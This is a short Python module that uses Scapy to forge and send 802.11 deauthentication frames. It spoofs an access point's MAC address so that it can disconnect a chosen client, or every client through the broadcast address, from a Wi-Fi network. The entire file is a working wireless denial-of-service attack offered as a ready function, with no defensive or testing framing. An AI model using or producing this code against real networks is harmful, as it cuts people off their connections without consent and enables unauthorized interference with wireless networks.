from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


DEAUTH_SUBTYPE = 12
DEFAULT_DEAUTH_REASON = 7


def build_deauth_packet(ap_mac: str, target_mac: str):
    """Build an 802.11 management deauthentication frame.

    The frame is addressed as AP/BSSID -> target station. Scapy's ``Dot11``
    defaults describe an association request, so type/subtype must be explicit
    or packet captures can decode the payload as the wrong 802.11 management
    frame.
    """
    dot11 = Dot11(
        type=0,
        subtype=DEAUTH_SUBTYPE,
        addr1=target_mac,
        addr2=ap_mac,
        addr3=ap_mac,
    )
    return RadioTap() / dot11 / Dot11Deauth(reason=DEFAULT_DEAUTH_REASON)


def deauth(ap_mac: str, target_mac: str, iface: str, frames: int = 10) -> None:
    """Send 802.11 deauthentication frames.

    Parameters
    ----------
    ap_mac : str
        MAC address of the access point.
    target_mac : str
        Client MAC to deauthenticate or ff:ff:ff:ff:ff:ff for broadcast.
    iface : str
        Interface to transmit on.
    frames : int, optional
        Number of frames to send, by default 10.
    """
    packet = build_deauth_packet(ap_mac, target_mac)
    sendp(packet, iface=iface, count=frames, inter=0.1, verbose=False)
